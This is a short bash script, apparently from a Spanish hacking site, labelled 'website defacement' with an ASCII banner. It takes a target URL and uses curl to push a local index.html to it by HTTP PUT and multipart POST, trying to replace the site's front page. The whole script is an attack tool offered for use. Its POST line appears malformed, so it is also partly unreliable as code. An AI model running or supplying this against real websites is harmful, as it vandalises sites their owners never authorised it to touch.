#!/bin/bash

Normal=$(echo 'printf' '\033[39m')
Verde=$(echo 'printf' '\033[32m')
Blanco=$(echo 'printf' '\033[0m')

$Verde
cat << "INFO"
               _         _ _             _       __                                    _   
              | |       (_) |           | |     / _|                                  | |  
 __      _____| |__  ___ _| |_ ___    __| | ___| |_ __ _  ___ ___ _ __ ___   ___ _ __ | |_ 
 \ \ /\ / / _ \ '_ \/ __| | __/ _ \  / _` |/ _ \  _/ _` |/ __/ _ \ '_ ` _ \ / _ \ '_ \| __|
  \ V  V /  __/ |_) \__ \ | ||  __/ | (_| |  __/ || (_| | (_|  __/ | | | | |  __/ | | | |_ 
   \_/\_/ \___|_.__/|___/_|\__\___|  \__,_|\___|_| \__,_|\___\___|_| |_| |_|\___|_| |_|\__| Beta
                                                                                           
INFO
$Blanco
echo "                                                           www.hackingyseguridad.com"
echo
$Blanco
if [ -z "$1" ]; then
        echo "Website defacement. "
        echo "Uso: sh $0 <URL>"
        exit 0
fi

echo
curl -T index.html $1
curl -X POST -F index.html $1
